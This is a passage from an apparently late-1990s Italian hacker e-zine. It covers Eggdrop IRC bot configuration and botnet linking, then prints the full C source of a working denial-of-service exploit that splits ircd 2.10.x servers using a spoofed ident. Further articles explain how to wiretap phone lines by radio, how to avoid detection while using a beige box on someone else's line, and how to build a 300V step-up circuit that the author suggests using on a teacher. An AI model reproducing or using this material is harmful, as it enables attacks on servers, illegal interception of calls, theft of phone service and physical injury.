   toglie tutti i ban dai canali quando entra il bot? (es, forza la ban list
   del canale per adattarla alla lista interna del bot)
enforcebans
   quando si setta un ban, kikka le persone che sono sul canale e le adatta
   ai nuovi ban?  (es, sono stati sul chan prima del ban)
dynamicbans
   attiva i ban sul canale solo quando necessario?  (questo prende la ban
   list del canale.  il bot ricorda ancora ogni ban, ma lo attiva sul canale
   quando vede qualcuno che entra con quel ban)
userbans
   permetti agli utenti di bannare?  (if turned off, the bot will
   require all bans to be made through the bot's console)
autoop
   oppa gli utenti con il flag op quando entrano in un canale?
   (e' una brutta IDEA!)
bitch
   lascia che gli utenti con il flag +o diventino op del chan?
greet
   dice un info line agli utenti che entrano in un chan?
protectops
   rioppa un utente con il flag +o quando viene deoppato?
statuslog
   logga lo stato del canale ogni 5 minuti? (si pensa che sia annoiante!)
stopnethack
   de-op qualcuno che entra nel canale con uno split quando un po' prima
   dello split non avevano l'op?
revenge
   ricarda le persone che deoppa/kikka/banna il bot o op validi, e li punisce?
   gli utenti con il flag +f (friend) sono esenti da questa opzione
autovoice
   da il voice agli utenti con il flag +v quando entrano in un chan?
secret
   previene questo canale dall'essere mostrato nella botnet?  
shared
   condivide le info degli utenti del canale per questo canale?
cycle
   rientra il canale quando perde gli op?
dontkickops
   volete che il bot non sia in grado di kikkare gli utenti con il flag +o ?
   lasciandoli al kick-flood , per proteggere il canale contro l'attacco
   dei cloni
seen
   risponde alle richieste seen(visto) nel canale? (deve essere caricato il
   modulo seen)

Per esempio: .chanset #Canale +autoop +autovoice

--[ Collegamento dei bot ]--

I bot possono essere collegati insieme, per lasciare gli utenti su tutti i bot
linkati di chattare in una grande partyline.
Ecco come linkarli:

Per primo, dovete conoscere i loro hosts e le loro porte.
Per prendere l'host, basta un /whois mentre e' su IRC.
Per prendere la porta telnet devi scrivere nel bot .dccstat
(Nota: ogni bot deve avere un differente host/porta)

Ecco un esempio di cosa prendere dopo aver digitato .dccstat:

SOCK  ADDR      PORT   NICK      HOST              TYPE
----  --------  -----  --------  ----------------  ----
3     C7CB1589  2000   (telnet)  *                 lstn
5     00000000  6667   (server)  irc.flashnet.it   serv (lag: 0)
7     C0725278  1469   Und3rk00l kazz.tin.it       chat flags: cPtEp/0

La porta e' quella porta affianco al nick (telnet). La porta 2000.

II. TERMINI USATI

I seguenti sono alcuni dei termini comuni usati in questo documento.
Se applicabile, c'e' anche il comando associato al named.


 Botnet
  Il termine e' usato per descrivere bot multipli connessi insieme.


 Link
  Il termine che significa il link attuale di un bot 

  comandi: ".link <nomebot>" ".unlink <nomebot>"


 Hub
  Un bot descritto come bot centrale. Se uno o piu' bot leaf (foglia) sono
  collegati ad esso.


 Leaf
  Un leaf e' un bot connesso ad un altro bot.


 Share
  Il termine usato per descrivere quando due bot si condividono le info.


 Aggressive Share
  Termine usato per descrivere il metodo dei file utente condivisi.
  La condivisione aggressiva mandera' i dati di un utente ad un altro bot.


 Passive Share
  Termine usato per descrivere la condivisione dei files-utente. La
  condivisione passiva ricevera' solo utenti da un altro bot.


 Flags
  Sono attributi che determinano cosa puo' fare e non puo' fare un bot
  Possono essere sia globali (+s) che specifici del canale (|+s #xj).
  Quelli che hanno effetto sulla botnet sono:

  s   condivide (le info utente saranno condivise aggressivamente)
  p   condivide (le info utente saranno condivise passivamente)
  g   condivisione globale (condivide tutti i canali)
  h   hub (il bot e' auto-linkato)
  a   alternato (il bou e' auto-linkato se il bot hub non puo' essere linkato)
  l   leaf (al bot non e' permesso essere linkato agli altri)
  r   reject (il bot non sara' lasciato sulla rete)
  i   isola (isola ls party line all'interno della botnet)
  0-9 user (flags definiti dagli user)

  comando: ".botattr <nomebot> [(.+<flag> [#canale]) o (.-<flag> [#canale])]
"
        

 Indirizzo
  L'indirizzo fisico, contenente l'indirizzo dell'host e la porta del bot.
  es. lame.org:3333

  comando: ".chaddr <nomebot> <indirizzohost:portabot[/portautente]>"


 Relay
 Il numero della porta di relay del bot se definita nel file di configurazione
 Nota che puoi definirne una per le connessioni telnet ad altri bot e un'altra
 per le connessioni di realy(cambio).


 Connessioni Relay 
 Una connessione realy e' usata per cambiare bot in una DCC chat.
 Puoi ancora cambiare bot sempre che questo non e' definito nel file di
 configurazione.

 comando: ".relay <nomebot>"


 Porta
  La porta telnet e' usata dal bot per comunicare con altri bot e/o
  utenti. Nota che puoi definire due porte distinte per l'utente e per il bot


III. A COSA SERVE UNA BOTNET?

Di solito la botnet e' necessaria quando volete usare piu' di un bot per
proteggere il vostro canale.
I bot linkati possono condividersi le informazioni degli utenti (globali o
specifiche di un canale) tra di loro o velocizzare attraverso script delle
precise operazioni. Per esempio uno script che da' l'op (oppa ogni bot della
botnet) o qualche tipo di script per prevenire i flood. Basta solo dare una
occhiata nella directory /pub/eggdrop/scripts1.3 del sito ftp.eggheads.org
e troverete molti script per botnet.


IV. AGGIUNGERE E COLLEGARE BOTS

Ora prima di spiegarvi come si collegano due bot, e' necessario conoscere
il seguente:

        Cosa sono i domini e le porte dei bots.

Diciamo che c'e' un Bot A su lame.org che ascolta sulla porta 3333 e un Bot B
su irc.org che ascolta sulla porta 4444. Ora avete da addare ogni bot al file
degli utenti (inclusa hostmask, indirizzo porta d'ascolto degli altri bot).
Nella console del Bot A scrivete ".+bot BotB irc.org:4444"
(presumendo che Bot B e' nel canale cosi' il dominio e' preso automaticamente,
in altri casi dovrete farlo manualmente con il comando ".+host") e sulla
console del Bot B digiterete ".+bot BotA lame.org:3333".
A questo punto potete linkarli per la prima volta scrivendo ".link BotA" sulla
console del BotB (o al contrario, di certo con BotB ".link BotB" sulla console
del BotA). I bot ora si daranno da soli nuove password random, che sono
memorizzate in un file senza nessuna crittazione. Ora avete generato la vostra
prima botnet.
Nota che potete aggiungere e linkare moltissimi bot.


V       L'USO DEI FLAGS DEI BOT

I flags dei bot sono necessari per assegnare funzioni speciali e lavori da
compiere ai vostri bot.

 "h" (hub - centrale)
  Se volete che il vostro bot si autolinki dopo essersi slinkato o riavviato
  (es. un reboot del server) dovrete settare +h il bot che volete linkare agli
  altri. Nota, potete assegnare +h solo un bot alla volta!

  comando: ".botattr <nomebot> +h"


 "a" (alternativo)
  Se i vostri bot leaf(foglia) non sono abili a linkarsi al vostro bot
  centrale, si connetterano ad un altro "hub-alternativo", che potete
  definire settando +a un bot.
  Nota, potete assegnare +a solo un bot alla volta!

  comando: ".botattr <nomebot> +a"


 "l" flag (leaf)
  Questo flag se assegnato ad un bot, lo fara' entrare nella botnet come bot
  'foglia' se e' stato specificato prima un bot 'centrale'.

  comando: ".botattr <nomebot> +l"


 "r" flag (reject)
  Se attribuite questo flag al bot, non sara' tollerato nella vostra botnet
  e sara' rigettato fuori ogni qual volta entrasse.

  comando: ".botattr <nomebot> +r"


 "i" flag (isolate)
  Settando questo flag ad un bot si effettuera' un isolamento nella partyline
  tra il vostro bot e gli altri.

  comando: ".botattr <nomebot> +i"


 "0-9" flag (utente)
  Questi 10 flag non serrvono all'eggdrop e possono essere assegnati da
  script o solo per gioco :-)

  comando: ".botattr <nomebot> +(0-9)"


 "s" flag (condivisione aggressiva)
   +s   Se setti sulla console del Bot A, il Bot B +s , il Bot A provera' a
        spedire il suo file utente (parti selezionate dai flag |s e g)
        agressivamente al BotB.

        comando: ".botattr <nomebot> +s"


   |s   Con questo flag potete definire nei canali, quale volete che i vostri
        bots condividono.
        Nota che potete usare questo flag solo sui bot +s!

        comando ".botattr <nomebot> |s #xj"

   |+s  Potete assegnare il canale per il quale il bot accettera' cambiamenti
        al suo file utente da un bot settato +p .

        comando: ".botattr <nomebot> |+s #xj"


 "p" flag (condivisione passiva)
  Se settate questo flag ad un altro bot, il vostro bot accettera' cambiamenti
  al suo file utente dall'altro.

        comando: ".botattr <nomebot> +p"


 "g" flag (condivisione globale)
  Se settate questo flag  sul vostro bot +s o +p, |s e |+s diventano obsolete.
  Ogni ban e ogni utente su ogni canale singolo sara' trasferito/accettato.

        comando: ".botattr <nomebot> +g"




VI      CREA DUE BOT CHE CONDIVIDONO GLI UTENTI REGISTRATI

Prima di iniziare a preparare i vostri bot alla condivisione, dovete essere
sicuri che avete caricato i moduli tranfer, share e filesys nel vostro bot
(guarda dentro la configurazione). Dovrete anche accertarvi che il canale,
per il quale gli utenti registrati dovrebbero essere condivisi, e' settato
+shared nella configurazione.

Se avete appreso tutte le richieste menzionate su, potete iniziare a preparare
i vostri bot.
Come prima cosa dovrete decidere quale bot deve condividere agressivamente
(BotA) e quale passivamente (BotB) riceve le registrazioni dedegli utenti.
Dovrete scrivere questo nella console del vostro bot (Nota: non potete
cambiare i flag dei bot linkati, potete farlo dopo averli slinkati):

Sul BotA:
.botattr BotB +s

Sul BotB:
.botattr BotA +p

Ora dovete decidere se il BotA deve condividere ogni canale con il BotB o solo
uno specifico. Se volete fargli condividere le recistrazioni utente in modo
globale, dovete scrivere il seguente:

Sul BotA:
.botattr BotA +g

Sul BotB:
.botattr BotA +g

Se non volete condividere  tutti i canali col BotB ma #xj si, dovete settare
il seguente:

Sul BotA:
.botattr BotA |s #xj

Sul BotB:
.botattr BotA |+s #xj

Potete anche aggiungere tanti canali a piacere, in questo caso.
Notate la condivisione delle registrazioni utente, condivide automaticamente
anche i bans e gli ignores (globalmente o canali specifici) con l'altro bot.
I flags dei bot non sono condivisi.

Nota: Preso dalla documentazione dell'eggdrop1.3.28.

--[ Cos'e' il TCL e cosa ha a che fare con gli eggdrop? ]--

Il TCL e' un linguaggio di programmazione che e' usato per scrivere scripts
per gli eggdrop. Ecco le basi visto che su l'intero argomento si trovano
veri e propri manuali.

Per caricare uno script TCL dovete aggiungere questa linea alla fine del
vostro script di configurazione: 
source filename.tcl

Potete trovare gli script TCL su: www.egghelp.org, bseen.tclslave.net e
xcalibre.net

Questi script implementano nuove funzioni agli eggdrop, come il kick su avviso
un nuovo comando per smurfare la gente da quella shell e altre molte cose :)


--[ Trucchetti ]--

Preso dalla documentazione dell'Eggdrop1.3.28.

Alcuni piccoli trucchetti che possono o non possono esserti d'aiuto...

* Puoi "chiudere" l'info line di un utente mettendo un '@' come prima lettera.
   Loro non potranno cambiarlo in nessun caso.

* '.status all' vi mostrera' automaticamente tutta la configurazione del
   vostro bot.

* Il TCL ha un comando 'info body <proc>' che mostrera' i contenuti di un
  processo.  'info args <proc>' mostra cosa avete definito come parametri per
  il processo.

* Potete rinominare un comando. Per rinominare '.status' in '.report',
  dovrete fare:
  unbind dcc - status *dcc:status
  bind dcc m report *dcc:status
  La prima linea rimuove il blocco costruito su '.status', e la seconda linea
  blocca '.report' alla funzione status costruita.  Altri esempi di creazione
  di comandi sono:
  unbind msg - status *msg:status
     bind msg m report *msg:status
  e:
     unbind fil - share *fil:share
     bind fil m link *fil:share

* Potete slinkare tutti i bots e cancellare le info della botnet dalla memoria
  usando '.unlink *'.  Cancella tutto cio' associato sui canali e ogni cosa.

* Potete creare automaticamente un ban permanente aggiungendo un * come primo
  carattere nel motivo del ban.

* Potete aggiungere un utente con un dominio statico usando .adduser
  prefissando il loro nick da !.
       es. con un dominio bell!ident@kazz.ton.ot
               .adduser bell
                       usa *!ident@*.ton.ot
               .adduser !bell
                       usa *!ident@kazz.ton.ot

--[ Bibliografia ]--
Documentazione Eggdrop1.3.28 
Conoscenza personale

[############################################################################]

                    --------------------------------------
                          BUG DEL DEMONE IRCD 2.10.X
                    --------------------------------------

Un bug del demone IRCd 2.10.x (qident) puo' essere usato per un attacco DOS

La vulnerabilita' scovata nel demone qident permette ad utenti irc remoti
di diventare utenti ghost sul server IRC, e di conseguenza e' possibile
crashare il server IRC, scaturando un vero e proprio DOS contro il server IRC.

Qident non controlla gli spazi e i caratteri come *, ! e @ .

Quando usiamo un ident come questo "@o ! ! !", la lettera 'o' puo' essere
riconosciuta come host e il resto dei parametri verranno aumentati dal numero
degli spazi datogli dall'ident.

Se questo ident viene accettato, il client connesso diventera' un ghost.
Questo ghost non trasmettera' con successo all'ircnetwork, quindi sara'
visibile solo sul server sul quale si e' connesso.

Cio' non e' un problema, il vero problema avviene quando il client con l'ident
finto entra in un canale. L'entrata non viene rifiutata dal network e
trasferisce l'ident falso con i parametri. Poi, accade "errore di protocollo"
e il server viene forzato a slinkarsi dal resto della rete irc.

In ogni caso, il client falso puo' essere corrotto, e cio' puo' causare un
crash definitivo del demone ircd.

exploit

Questo e' un semplice exploit che esegue un client IRC con un ident spoffato.
Il demone ident non dovra' essere in esecuzione mentre si sta usando l'exploit.
Per usarlo dovrete essere root (per usare il bind).
Il codice dell'exploit e' stato scritto per Linux.

------COMINCIA A TAGLIARE------DOOMZDAY.C------
/* DooMzDaY v4 - ircd 2.10.x/ircnet - exploit
* for linux - written by psychoid from tcl
*
* general vulnerability found by Hippo
* a fix already is available, but there are
* also incomplete fixes out there.
*
* this splits a server from the network. Simple, isnt it ?
*
* if you really want to run this, there should not run
* an in.identd on your machine. Also, you need to be root.
*
* erm, this is for educational purposes only. Even, if noone gets
* hurt *g*.
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <setjmp.h>
#include <signal.h>
#include <string.h>
#include <sys/time.h>

jmp_buf jumpback;

void timed_out( int sig ) {
longjmp( jumpback, 0x0 );
}

void fuck_it(int sig) {
longjmp( jumpback, 0x0 );
}

int settimeout(unsigned short sockh, unsigned short timeout) {
fd_set rfds;
struct timeval tv;
FD_ZERO(&rfds);
FD_SET(sockh,&rfds);
tv.tv_sec=timeout;
tv.tv_usec=0;
select(sockh+1,&rfds,NULL,NULL,&tv);
if (!FD_ISSET(sockh,&rfds)) {
return 0;
} else {
return 1;
}
/* returns 0=timeout or error, 1=input there */
}


unsigned long lookup(char *hostname)
{
struct hostent *name;
unsigned long int address;

if ((address = inet_addr(hostname)) != -1)
return address;
if ((name=gethostbyname(hostname)) == NULL)
return -1;
memcpy(&address,name->h_addr,name->h_length);
return address;

}

int writesock(int sock,char *buf)
{
write(sock,buf,strlen(buf));
}

int readsock(int sock,char *buf,int size)
{
int rc;
fd_set rfds;
struct timeval tv;
int cnt;
memset(buf,0x0,size);
cnt=0;
if (settimeout(sock,1)==1) {
do {
rc=read(sock,buf+cnt,1);
if (rc==0) return rc;
if (rc==-1) return rc;
cnt++;
} while (buf[cnt-1] != '\n' && buf[cnt-1] != '\r' && cnt<size);
}
return 0;
}

int sockconnect( unsigned short timeout, unsigned long iP, unsigned short port
) {
int socky;
int wasread;
int currentsock;
struct sockaddr_in address;
struct hostent *athost;
char lasock[0x100];
unsigned long tip;
unsigned short prt;
FILE *sockslist;
FILE *lastsock;

if (( socky = socket( AF_INET, SOCK_STREAM, 0x0 )) == -1 ) {
return socky;
}

address.sin_family = AF_INET;

address.sin_port = htons( port );
address.sin_addr.s_addr = iP;
signal( SIGALRM, timed_out );
alarm(10);

if ( setjmp( jumpback ) == 0x0 ) {
if ( connect( socky, (struct sockaddr*)(&address), sizeof( address ))) {
socky = -1;
}
} else { socky = -1; }

fflush(stdout);

alarm (0);
return socky;

}

void brokenpipe()
{
printf("Broken Pipe\n");
return;
}

int tcpconnect( unsigned long iP,
unsigned short port,
unsigned short timeout ) {

int socky;
struct sockaddr_in address;
struct sigaction sv;
struct hostent *athost;
char thathost[0x100];
char buffer[512];

int tries, length;
socky = -1;
tries = 0;

sigemptyset(&sv.sa_mask);
sv.sa_handler=brokenpipe;
sigaction(SIGPIPE,&sv,NULL);

/* if ((athost = gethostbyname (thathost)) == NULL) {
return -1;
}*/

fflush(stdout);
if ((socky = sockconnect(timeout,iP,port)) == -1) {
fprintf(stdout,"Connection refused.\n");
socky = -1;
return socky;
}

if (socky == -1) printf("Connection refused.\n");
alarm( 0x0 );

return socky;
}


int ircdboost(char *host, int port, char *nick)
{
int sock;
char buf[2048];
char *pt;
printf("Step 2: Connecting to the IRC Server.\n");
sock=tcpconnect(lookup(host),port,10);

if (sock==-1) {
printf("Error: cant connect\n");
exit(0x0);
}
printf("Step 3: Connected.. sending user / join\n");
/* the star is very very important */
writesock(sock,"USER o a a :a\r\n");
snprintf(buf,sizeof(buf),"NICK %s\r\n",nick);
writesock(sock,buf);
snprintf(buf,sizeof(buf),"WHOIS kbnn%d\r\n",lookup(host));
writesock(sock,buf);
/* this joins are needed to broadcast the user to the connected servers */
writesock(sock,"JOIN #hacker.it\r\n"); /* yeah, right */
writesock(sock,"JOIN #hackernow\r\n"); /* yeah, right */
writesock(sock,"JOIN #cybernet\r\n"); /* yeah, right */
writesock(sock,"JOIN #sesso\r\n"); /* yeah, right */
writesock(sock,"JOIN #it@lia\r\n"); /* yeah, right */
writesock(sock,"JOIN 0\r\n"); /* yeah, right */
printf("Step 4: Please press control+break to release the split.\n");
while (readsock(sock,buf,sizeof(buf)) >=0)
{
pt=strstr(buf,"PING");
if (pt==buf)
{
writesock(sock,"PONG :PPP\r\n");
}
pt=strstr(buf,"ERROR");
if (pt==buf) break;
printf(buf);
}
close(sock);
}

int
main (int argc, char **argv)
{
int listensocket, insocket, outsocket;
short listenport, destport;
struct hostent *socks_he, *dest_he;
struct sockaddr_in listen_sa, socks_sa;
char buf[200];
int sopts = 1, maxfd;
char c[100];
char *po;
int length;
int cnt;
int rc;
int lport,fport;
fd_set rfds;
lport= 0; fport =0;

printf("\nDooMzDaY v4 - by psychoid\n");
printf("exploits a bug in the ircd ident request of ircd 2.10.x\n");

if (argc != 4)
{
printf ("Usage: %s ircserver port nick\n", argv[0]);
printf ("Example: %s chat.bt.net 6669 killah\n\n", argv[0]);
exit (1);
}

printf("Setting up..\n");

listenport = 113;

listensocket = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
setsockopt (listensocket, SOL_SOCKET, SO_REUSEADDR, &sopts, sizeof (int));

memset (&listen_sa, 0, sizeof (struct sockaddr_in));

listen_sa.sin_port = htons (listenport);
listen_sa.sin_addr.s_addr = htonl (INADDR_ANY);

socks_sa.sin_port = htons (destport);

if ((bind (listensocket, (struct sockaddr *) &listen_sa, sizeof (struct sockadd
r_in))) == -1)
{
perror ("bind");
exit (1);
}
if ((listen (listensocket, 1)) == -1)
{
perror ("listen");
exit (1);
}

rc=fork();
if (rc ==0) {
printf("\nStep 1: Starting identd\n");
sleep(2); /* the demon should really run */
ircdboost(argv[1],atoi(argv[2]),argv[3]);
exit(0x0);
}
gee:
sleep(1);
printf(" Identd started.. listening.\n");
insocket = accept (listensocket, NULL, 0);
if (insocket == -1)
{
perror ("accept");
exit (1);
}

while (1)
{
memset(c,0x0,sizeof(c));
FD_ZERO (&rfds);
FD_SET (insocket, &rfds);
select (insocket+1, &rfds, NULL, NULL, NULL);
if (FD_ISSET (insocket, &rfds))
{
length = recv (insocket, c, 100, 0);
if (length == -1 || length == 0)
break;
sscanf(c," %d , %d", &lport, &fport);
snprintf(buf,sizeof(buf),"%d , %d : USERID : UNIX : @o ! ! ! ! ! ! \r\n",lport,
fport);
printf("\nIdent : %s\n",buf);
/* sending it a second time because of the lame 1st patch */
send(insocket,buf,strlen(buf),0);
snprintf(buf,sizeof(buf),": USERID : UNIX : @o ! ! ! ! ! ! \r\n");
printf("\nIdent : %s\n",buf);
send(insocket,buf,strlen(buf),0);
break;
}
}
sleep(1);
close (insocket);
close (listensocket);
wait(0);
exit(0x0);
}

------CAZZ SMETTI DI TAGLIARE------

Non fate troppo i lamer con questo exploit, ritenetelo come un codice da
capire e sfruttare per apprendere il funzionamento del demone irc.

                                                                 T0rment0

[############################################################################]
[----------------------------PhreakinG---------------------------------------]
[############################################################################]

           -----------------------------------------------------
                 INTERCETTARE LE TELEFONATE VIA ONDE RADIO
           -----------------------------------------------------

Se volete intercettare tutto quello che passa su una linea telefonica
potete farlo comodamente da casa vostra, purche' vi troviate abbastanza
vicino alla centralina, o cmq al punto della linea nel quale avete installato
il circuito. Ovviamente via onde radio. Il segnale presente su quella linea
sara' modulato in AM e inviato a voi su una frequenza poco, usata e voi
con un demodulatore-amplificatore potrete sentire tutto quello che passa
sulla linea direttamente nella vostra stanza.
Il primo passo e' costruire il modulatore/oscillatore che comporra'
lo stadio trasmittente.
Per farlo useremo due inverter che troveremo sotto forma di integrato TTL,
e all'alimentazione dello stesso inseriremo in serie il segnale captato
dalla linea, che verra' cosi' modulato in am sulla frequenza del nostro
oscillatore che sara' cosi' costruito :


		 ---------------------------------.
		|                            |\   |  |\
		|____/\/\/\/\----------------| >o-:-+| >o---uscita 
				       |     |/      |/ 	
				      ===	
				      ===	
				       |
				      ---
				       -	
	 	   
I due inverter fanno parte dell'integrato 74HC14, ai piedini 7 e 14 di questo
integrato inseriremo l'alimentazione di 5 volt (usate un diodo zener)
in serie con il segnale della linea, mentre i piedini
1-2 e 3-4 li useremo come inverter. Il funzionamento e' chiaro, quando 
all'entrata dell'inverter c'e' un livello logico 0 all'uscita c'e' 1 che
carica il condensatore, che una volta caricato dara' un 1 in entrata all'inv.,
all'uscita ci sara' 0 e il condensatore si scarichera', ecc.
La frequenza e' stabilita dalla resistenza e dal condensatore, ma ricordate
che i ttl della serie 74HC non possono lavorare con frequenze maggiori di
55Mhz.
Ciao ciao.
                                                         Techno Knight
                                                      (techno83@freemail.it)
                                                            
[############################################################################]

		    =================================
	            =.	COME RENDERE PIU' SICURO   .=
		      =,    IL TUO BEIGE-BOX     ,=
			=========================

Bello il beige box, solo che si rischia di essere sgamati no? Allora vediamo
di modificarlo un po' per andare piu' sul sicuro.
Vabbe' per chi non lo sapesse il beige box e' come un telefono, solo con la
possibilita' di essere collegato praticamente ovunque grazie al fatto che
ha due morsetti a coccodrillo al posto della classica spina dei telefoni.
Possiamo dire che e' questo box e' l'ultima risorsa quando tutti i bug
sfruttati dagli altri vengono risolti dalla compagnia telefonica, infatti
questo box si piazza su una linea telefonica e non c'e' modo di rivelarne
la presenza o di capire che non si tratta del leggittimo utente di quella
linea (in realta' una soluzione si trova sempre a tutto, e a cercare bene
il modo ci sarebbe pure, ma ora non addentriamoci nei particolari, 
accontentiamoci di sapere che il beigebox funziona e funzionera' ancora a 
lungo ;) 
Il primo problema e' che se l'utente della linea alza il suo telefono mentre
stiamo parlando con i parenti emigrati in america, ci sgamera' subito.
Certo se ci accontentiamo di fare una telefonata veloce le possibilita' che
questo accada sono minime, ma se stesse gia' telefonando? Se disponete di un
telefono col tasto mute potete semplicemente tenerlo premuto finche' non 
siete sicuri che la linea sia libera. Altrimenti potete costruirvi un piccolo
circuito che controlli questo per voi (potreste anche controllare con un
tester, ma un tester costa diverse decine di migliaia di lire, mentre questo
circuito che vi faro' vedere non niente, insomma se il negoziante non e'
proprio rompiballe penso che non ve li fara' neanche pagare sti due componenti)
  
R1=3300 Ohm
D1=Diodo Led
       			        R1     D1
			   .---/\/\/\--|>--.
			   |	           |
			   |               |
			   |		   |
		              ALLA LINEA

Inserite prima questo nella linea, se il diodo si accende allora vuol dire
che non hanno il telefono alzato, e potete inserire il vostro beige box.
Se avete un minimo di esperienza potreste modificare la box in modo che
faccia automaticamente un'operazione simile, o magari costruirvene uno 
personalizzato...
Un'altra cosa che dovreste fare e' modificarlo in modo che premendo una
semplice levetta si stacchi automaticamente dalla linea, molto piu' veloce
che premendo i pulsanti e staccando i coccodrilli. Inoltre anche se 
utilizzate il dispositivo di prima per controllare se e' alzato, se
non avete un tasto mute sarete facilmente sgamabili in caso volete solo 
ascoltare le telefonate, quindi dovreste aggiungere anche un interruttore
che scolleghi il microfono del telefono quando intendete fare questo.
bye bye.

                                                           Techno Knight
                                                       (techno83@freemail.it)
                                                      
[############################################################################]
[----------------------------EletronichS-------------------------------------]
[############################################################################]

             -------------------------------------------
                   RICEVITORI A DOPPIA CONVERSIONE
                           DI FREQUENZA
                     (CONVERTITORI DI FREQUENZA)
             -------------------------------------------

Il sistema a doppia conversione di frequenza viene utilizzato di solito per
aumentare la sensibilita' e la selettivita' di un ricevitore.
Perche' ne parlo su quest'ezine ? Per 2 motivi :

1- Qualche articolo lo dovevo pur scrivere

			e

2- Questo metodo puo' essere utilizzato per ampliare la gamma di frequenze
   ricevibili, quindi potrete utilizzare una normale radio per ascoltare
   cose che non dovreste sentire :)


Come vedete sono 2 ottimi motivi. Allora questi fantasmagorici apparecchi
sono dei convertitori, nel senso che ricevono una certa frequenza e in uscita
danno il segnale ricevuto ma su un'altra frequenza! Quindi se dobbiamo  
ascoltare una frequenza A che ci interessa ma abbiamo solo un ricevitore per
la frequenza B (perche' quelli per A non si trovano in commercio o costano un
occhio della testa) dobbiamo costruire uno di questi convertitori che riceva 
A e la converta nella frequenza B. L'uscita di questo convertitore andra'
collegata all'antenna del nostro ricevitore.  
Se avete un QI>25 avrete gia' capito l'enorme vantaggio che questo comporta
rispetto alla costruzione di un intero ricevitore. Nel caso del ricevitore
piu' modesto ci risparmieremo comunque uno stadio demodulatore e stadi
preamplificatori. Un convertitore di questo tipo e' costituito da un
oscillatore interno che genera una certa frequenza. Questa, miscelata con
la frequenza da ascoltare ci permettera' di ottenere altre due frequenze :
la somma e la differenza delle due frequenze iniziali. Di queste due 
prenderemo, grazie ad un circuito di sintonia, solo quella che il nostro
apparecchio puo' ricevere. Ovviamente dovremo anche decidere la frequenza
dell'oscillatore del convertitore in base alla frequenza da convertire.
Per "miscelare" la frequenza captata con quella generata dal nostro 
oscillatore possiamo usare un transistor. Applicheremo una della due
frequenze sulla base e una sull'emettitore, cosi' ritroveremo sul
collettore un segnale costituito dalla somma e dalla differenza delle
due frequenze su B ed E, quindi al collettore collegheremo un circuito
di sintonia che faccia passare solo quella che ci serve, riducendo l'altra,
e questa sara'l'uscita di questo semplice ma utile circuito. 
Se volete complicarvi la vita potete anche utilizzare + oscillatori
per fare + somme (o sottrazioni) successive.
E adesso molti di voi si aspetteranno un circuito gia' bello e fatto ma
non lo avrete perche' :

1- Mi sembra di aver detto tutto e dovreste essere capaci di progettarvi da
   soli il circuito che fa al caso vostro

2- L'unica parte un po' piu' difficile e' l'oscillatore, ma il discorso e'
   abbastanza lungo da meritare un altro articolo (magari nel prossimo 
   numero)


		Techno Knight (techno83@freemail.it)    


[############################################################################]

                  ---------------------------------   
			ELEVATORE DI TENSIONE
                  ---------------------------------

Questo circuito (che personalmente non ho mai costruito ma che dovrebbe 
funzionare,almeno teoricamente) converte una tensione di circa 12 volt in
una tensione fino a 300V. Vediamo come costruirlo.
Componenti :

R1 = 39 kOhm
R2 e R3 = 4,7 kOhm 
R4 = 33 kOhm
R5 = 4,7 MOhm
R6 = 1 MOhm
C1 = 1000 uF 16V elettrolitico
C2 = 22uF 350V elettrolitico
C3 = 4700pF ceramico
Rt = Trimmer 4,7 MOhm
L1 = Induttore toroidale 1,6mH
D1 e D2 = 1N4007
T1 = IRF 830
T2 e T3 = BC237 
IC1 = 555 (e zoccolo)

Ed ecco lo schemino (spero che lo capiate, meglio di cosi' non riuscivo a
farlo) :

(Dove c'e' un intersezione se trovate il segno '+' vuol dire che i due
fili non sono collegati, e stanno cosi' solo perche' non sapevo o non potevo
farli in un altro modo)

      D1                               L1        D2  
12+ --|>----.-----.------.------.---^_^_^_^------|>-------- 300+
            |     \      |      |          |        |  |  |
           +|   R2/      |      |-----.    |        \  |  |
	   ===    \      4______8     |    |     Rt /  |  |
        C1 ===    |----7|        |    |   _:_       \  |  |+ 
            |     |     |        |3---+--(___)T1    |  | ===
            |     \     |        |    |    |        |  | === C2
	    |   R1/     |  IC1   |    \    |        \  |  |
            |     \     |        | R3 /    |     R5 /  /  |
            |     |----6|        |    \    |        \  \  |
            |     |----2|________|5---:    |        |  /R6| 
            | C3 ===        1         |    |        |  |  |
            |    ===        |         |    |        |  |  | 
            |     |         |         |    |        |  |  |
12- --------'-----'---------'---------+----'--------+--'--' 300-
				      |		    |     |
				      |_________ C  |     | 
                                      |         \   |     |
				       \	(>)--     |
	                            T2 (>)______/ T3 \    |
				       /	E    / R4 |	
				      |              \    |
				      |______________|____|	
 

UFF che faticaccia, per la realizzazione pratica arrangiatevi.
Il primo impiego che mi viene in mente sarebbe portarlo a scuola per dare
una bella lezione a qualche professore.
Mi raccomando non toccate mai l'uscita.
Anche se non c'entra niente, solo per restare nel campo dell'elettronica
"ACCAPADICAZZO", ho costruito un ricevitore di AM utilizzando solo due
componenti! (unico difetto : si prende solo Radio1)

			Techno Knight (techno83@freemail.it)


[############################################################################]
[----------------------------AnarchY-----------------------------------------]
[############################################################################]

[############################################################################]
[----------------------------EndZ--------------------------------------------]
[############################################################################]
[---------------    --     -- ------ --- --     -- --------------------------]
[-------------- ------ --- -- ------ --- ---- ---- --------------------------]
[--------------- -----     -- ------ --- ---- ---- --------------------------]
[----------------- --- --- -- ------ --- ---- ---- --------------------------]
[--------------   ---- --- --     --     ---- ---- --------------------------]

T0rment0 vuole salutare:
\think\ - Perche' sta crescendo a vista di Linux!
Techno Knight - Perche' e' bravo non solo con il pc.
Und3rk00l - Perche' su irc mi diverte tantissimo
{-Paolo} - Perche' se la crede!
_p0nic0_ - Perche' era ansioso di vedere quest'ezine...contento? ;)
Devil - Perche' ha fatto una scomessa con me :ppp
N0body88 - Anche se non lo vedo da due mesi, lo saluto lo stesso :)
B_Berry - Perche' e' simpatico :)

\think\ vuole ringraziare:
.T0rment0 perche' si sta sciupando appresso alle femmine 
.Techno Knight , che ragiona in Assembler =)
.LadyAxel , perche' nonostante tutto , e' una persona che stimo molto, e alla
quale voglio bene.
.Alla mia fede
.Tutto il canale appresso al quale butto tutti quei soldi che vanno a
mamma Telecom. (Bissio, tvb =)
.Ad Und3rk00l, che e' un tipo troppo ganzo, ma non capiro' mai
perche' si e' scelto un nick simile :)
.A tutti quelli che ho dimenticato. :P

techno[k] vuole salutare:
